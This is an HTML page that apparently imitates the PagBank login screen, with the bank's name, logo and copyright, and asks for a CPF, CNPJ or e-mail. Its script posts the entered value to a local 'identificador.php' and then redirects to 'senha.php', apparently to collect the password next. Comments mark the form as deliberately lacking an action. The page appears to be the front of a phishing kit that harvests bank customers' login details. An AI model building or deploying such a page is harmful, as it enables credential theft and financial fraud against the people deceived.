<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>PagBank</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background: #fff;
      color: #000;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      border-bottom: 1px solid #e5e5e5;
    }

    header img.logo {
      height: 32px;
    }

    header .lang {
      font-size: 14px;
    }

    main {
      display: flex;
      justify-content: center;
      padding: 60px 20px;
    }

    .login-box {
      width: 380px;
    }

    .login-box h1 {
      font-size: 22px;
      margin-bottom: 10px;
    }

    .login-box p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 20px;
      background: #007fc7;
      color: #fff;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .link-outline {
      display: block;
      text-align: center;
      margin-top: 16px;
      font-size: 14px;
      color: #007fc7;
      text-decoration: none;
    }

    .comunicar {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-top: 30px;
      font-size: 13px;
      color: #333;
    }

    .comunicar img {
      width: 18px;
    }

    footer {
      margin-top: 80px;
      padding: 30px;
      background: #111;
      color: #aaa;
      font-size: 12px;
      text-align: center;
    }
  </style>
</head>
<body>

<header>
  <img src="imagens/logo-pagbank.svg" class="logo" alt="PagBank">
  <div class="lang">PT</div>
</header>

<main>
  <div class="login-box">

    <h1>Entrar</h1>
    <p>Digite seu CPF, CNPJ ou e-mail</p>

    <!-- ❌ SEM ACTION -->
    <form id="formLogin">

      <input
        type="text"
        id="identificador"
        placeholder="CPF, CNPJ ou e-mail"
        autocomplete="off"
        required
      >

      <!-- ❌ NÃO SUBMIT -->
      <button type="button" id="btn">Continuar</button>

      <a href="#" class="link-outline">Criar conta</a>

      <div class="comunicar">
        <img src="imagens/icon-phone.svg" alt="">
        Comunicar perda ou roubo de celular
      </div>

    </form>

  </div>
</main>

<footer>
  © 1996-2025 PagBank. Todos os direitos reservados.
</footer>

<script>
document.getElementById('btn').addEventListener('click', function () {

  const input = document.getElementById('identificador');
  const valor = input.value.trim();

  if (!valor) {
    alert('Informe CPF, CNPJ ou e-mail');
    return;
  }

  fetch('identificador.php', {
    method: 'POST',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body:
      'identificador=' + encodeURIComponent(valor) +
      '&device_type=Desktop'
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === 'success') {
      // ✅ REGRA CERTA
      window.location.href = 'senha.php';
    } else {
      alert('Usuário inválido');
    }
  })
  .catch(() => {
    alert('Erro de conexão');
  });

});
</script>

</body>
</html>
